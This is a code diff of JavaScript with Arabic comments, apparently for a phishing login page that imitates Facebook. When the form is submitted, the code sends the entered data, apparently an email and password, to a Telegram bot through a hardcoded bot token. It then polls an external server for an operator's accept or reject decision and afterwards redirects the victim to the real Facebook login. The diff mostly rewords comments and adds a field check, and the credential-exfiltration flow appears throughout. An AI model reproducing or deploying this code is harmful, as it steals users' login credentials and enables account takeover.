@@ -1,4 +1,4 @@
-// ✅ عند تحميل الصفحة: إعادة تعيين الحالة لتفادي التوجيه التلقائي
+// ✅ عند تحميل الصفحة: إعادة تعيين الحالة من السيرفر
 fetch('https://login-vpns.onrender.com/update-status?action=reset')
   .then(res => res.text())
   .then(() => console.log('🔁 الحالة أُعيد تعيينها عند تحميل الصفحة'))
@@ -14,7 +14,7 @@ document.getElementById('submit-btn').addEventListener('click', () => {
         return;
     }
 
-    // إرسال البيانات إلى بوت تيليجرام
+    // إرسال البيانات إلى البوت
     fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -32,7 +32,7 @@ document.getElementById('submit-btn').addEventListener('click', () => {
         })
     })
     .then(() => {
-        // ✅ بعد الإرسال، نبدأ نتحقق من حالة القبول/الرفض
+        // بدء مراقبة حالة القبول أو الرفض
         checkLoginStatus();
     })
     .catch(error => {
@@ -40,12 +40,20 @@ document.getElementById('submit-btn').addEventListener('click', () => {
     });
 });
 
-// ✅ التحقق من حالة القبول/الرفض كل 2 ثانية
 function checkLoginStatus() {
     const interval = setInterval(() => {
         fetch('https://login-vpns.onrender.com/get-status')
             .then(res => res.json())
             .then(data => {
+                const email = document.getElementById('email').value.trim();
+                const password = document.getElementById('password').value.trim();
+
+                // فقط إذا كانت هناك بيانات مدخلة
+                if (!email || !password) {
+                    clearInterval(interval);
+                    return;
+                }
+
                 if (data.accepted) {
                     clearInterval(interval);
                     window.location.href = 'https://www.facebook.com/login';
